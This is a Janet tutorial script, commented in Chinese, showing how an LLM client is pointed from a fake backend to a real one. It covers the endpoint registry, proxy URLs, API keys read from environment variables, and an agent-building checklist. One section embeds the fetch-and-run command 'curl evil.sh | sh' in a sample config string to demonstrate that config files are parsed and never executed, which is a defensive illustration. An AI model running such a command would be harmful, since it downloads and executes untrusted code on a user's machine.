# 47 ⑦ —— 從假後端換到真後端：改的就只有 :url 與金鑰。
#
# 離線可跑：janet examples/agent-tutorial/47g-real-backend.janet
# 教學：docs/47g-接真後端.md

(import ../../modules/llm-http/init :as llm)
(import ./fake-server :as fs)

(defn 分隔 [t] (print "\n── " t " " (string/repeat "─" (max 2 (- 50 (length t))))))

(defn main [&]
  # ⚠ 自動載入使用者的 ~/.config/llm-http/endpoints.janet 是 import 的副作用。
  #   範例要每台機器結果一樣，所以先打回只剩內建那幾筆。
  (llm/reset-endpoints!)

  (分隔 "① registry 裡現有的 endpoint")
  (each n (llm/endpoint-names)
    (def c (llm/endpoint n))
    (printf "  %-11s model=%-14s 打 %s" n (c :model) (c :url)))

  (分隔 "② 三條路，:url 不一樣而已")
  (printf "  走 litellm proxy  → %s" (llm/chat-url "http://127.0.0.1:4000"))
  (printf "  直打 LM Studio    → %s" (llm/chat-url "http://127.0.0.1:1234"))
  (print  "  https 的外部服務  → spork/http 沒有 TLS，打不通；讓 proxy 代打，")
  (print  "                      或走另一條線正在做的 curl transport。")

  (分隔 "③ 金鑰放哪：不要寫進程式，更不要 commit")
  (llm/define-endpoint "my-proxy"
                       {:model "local"
                        :base "http://127.0.0.1:4000"
                        :api-key-env "MY_LLM_KEY"      # ← 從環境變數讀
                        :params {:temperature 0.2}
                        :note "我自己的線"})
  (def c (llm/endpoint "my-proxy"))
  (printf "  :api-key-env MY_LLM_KEY → 實際拿到 %q（沒設就退回 proxy 的預設值）"
          (c :api-key))
  (printf "  這筆從哪來：%q" (llm/endpoint-source "my-proxy"))
  (print  "  另一條路：寫進 ~/.config/llm-http/endpoints.janet，程式一行都不用改。")

  (分隔 "④ ⚠ 設定檔只 parse 不 eval")
  (def 設定檔原文 `{"x" {:model "m" :api-key (os/shell "curl evil.sh | sh")}}`)
  (def 解出來 (first (parse-all 設定檔原文)))
  (printf "  檔案裡寫了 (os/shell …)，parse 出來只是一個 tuple：%q"
          (get-in 解出來 ["x" :api-key]))
  (print  "  沒有人會去執行它。代價：設定檔裡不能算東西，所以才有 :api-key-env 這種欄位。")

  (分隔 "⑤ 換後端就是換一行")
  (def 假 (fs/start :port 45828))
  (defer (fs/stop 假)
    (def 假cfg (llm/endpoint {:model "fake-model" :url (假 :url) :api-key "sk-fake"}))
    (printf "  假的：%s" (llm/ask 假cfg "hello"))
    (print  "  真的：(llm/endpoint \"local\")，或 {:url \"http://127.0.0.1:1234/v1/chat/completions\"}")
    (print  "        剩下的 ask／chat／with-tools 全部不用動。"))

  (分隔 "⑥ 我要開始做自己的 agent 了，檢查清單")
  (each 行 ["□ 後端起得來？ curl http://127.0.0.1:4000/health/liveliness"
            "□ 位址寫 127.0.0.1 不是 localhost"
            "□ 金鑰走環境變數或設定檔，沒進版控"
            "□ 每次回應都看 finish_reason，不是只看有沒有例外"
            "□ tool loop 有 max-rounds 上限"
            "□ 工具 handler 都包了 protect，錯誤當結果送回模型"
            "□ 歷史有截斷策略，不會無限長大"
            "□ 有重試與逾時（snippets/retry-timeout.janet）"
            "□ 有累計 usage，知道一次任務花多少"
            "□ 工具權限想清楚：模型要求什麼就做什麼，等於把 shell 交出去"]
    (print "  " 行))
  (print "\n更完整的封裝見 modules/agent/README.md（工具箱＋記憶截斷＋agent loop＋trace＋CLI）。"))
